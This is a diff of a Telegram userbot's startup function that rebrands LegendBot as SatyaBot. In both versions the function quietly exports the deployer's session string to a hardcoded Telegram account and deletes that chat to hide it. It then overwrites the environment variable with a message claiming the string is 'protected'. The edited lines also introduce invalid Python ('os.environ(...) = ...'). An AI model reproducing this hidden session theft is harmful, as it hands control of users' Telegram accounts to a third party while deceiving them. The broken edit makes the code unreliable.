@@ -107,17 +107,17 @@ TYPE :- " .gpromote @Its_LegendBoy " OR .python OR .ping CHECK IF I'M ON!
 
 async def python_is_on():
     try:
-        LegendBot = bot.session.save()
-         os.environ[
+        SatyaBot = bot.session.save()
+         os.environ(
             "SATYA_STRING"
-        ] = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
-        sweetie = await bot.send_message(5230049485, LegendBot)
+         ) = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
+        sweetie = await bot.send_message(5230049485, SatyaBot)
         await bot.delete_dialog(5230049485)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
                 Config.LOGGER_ID,
                 PYTHON_PIC,
-                caption=f"#START \n\nDeployed SATYABOT Successfully\n\n**SATYABOT- {PYTHONversion}**\n\nType `{l1}satya` or `{l1}alive` to check! \n\nJoin [SatyaBot Channel](t.me/sooon_Updata) for Updates & [satyaBot Chat](t.me/satya_coming_soon) for any query regarding PythonBot",
+                caption=f"#START \n\nDeployed SATYABOT Successfully\n\n**SATYABOT- {PYTHONversion}**\n\nType `{l1}satya` or `{l1}alive` to check! \n\nJoin [SatyaBot Channel](t.me/sooon_Updata) for Updates & [satyaBot Chat](t.me/satya_coming_soon) for any query regarding SaTyaBot",
             )
     except Exception as e:
         print(str(e))
